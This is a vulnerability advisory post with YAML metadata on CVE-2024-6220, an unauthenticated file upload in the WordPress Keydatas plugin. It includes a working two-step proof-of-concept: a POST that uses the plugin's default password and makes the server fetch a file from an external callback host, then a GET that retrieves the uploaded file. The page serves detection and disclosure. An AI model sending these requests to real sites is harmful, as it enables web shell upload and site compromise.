---
layout: post
cve_id: CVE-2024-6220
title: WordPress Keydatas ‚â§ 2.5.2 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2024/CVE-2024-6220.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6220.yaml
snort2_rule: N/A
snort3_rule: N/A
author: hnd3884
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary files including PHP web shells
  through the keydatas_downloadImages function, achieving remote code execution and
  complete site compromise.

  '
remediation: 'Update Keydatas plugin to version 2.5.3 or later to address the arbitrary
  file upload vulnerability.

  '
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/keydatas/keydatas-252-unauthenticated-arbitrary-file-upload
- https://github.com/advisories/GHSA-29rm-j4cx-hmc5
- https://nvd.nist.gov/vuln/detail/CVE-2024-6220
classification:
  cve-id: CVE-2024-6220
  epss-score: 0.7782
  epss-percentile: 0.98956
  cwe-id: CWE-434
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cpe: cpe:2.3:a:keydatas:keydatas:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: keydatas
  product: wordpress
tags:
- cve
- cve2024
- wp
- wp-plugin
- wordpress
- keydatas
- file-upload
- rce
- vkev
---

## üîç Vulnerability Description
The Keydatas plugin for WordPress (known in Chinese as "ÁÆÄÊï∞ÈááÈõÜÂô®") is vulnerable to unrestricted file uploads due to missing file-type validation in the keydatas_downloadImages function in all versions up to and including 2.5.2. An unauthenticated attacker can upload arbitrary files to the server ‚Äî potentially leading to remote code execution, site takeover, or other severe compromise.


## üåê HTTP Request
```nohighlight
POST /?__kds_flag=post HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15
Connection: close
Content-Length: 141
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

kds_password=keydatas.com&post_title=1&__kds_docImgs=http://d5jk6l1le0o4450h8gvg8sshhe9smkw18.oast.pro/QTzePzqR&__kds_download_imgs_flag=true
```

```nohighlight
GET /wp-content/uploads/ZsYLgV HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

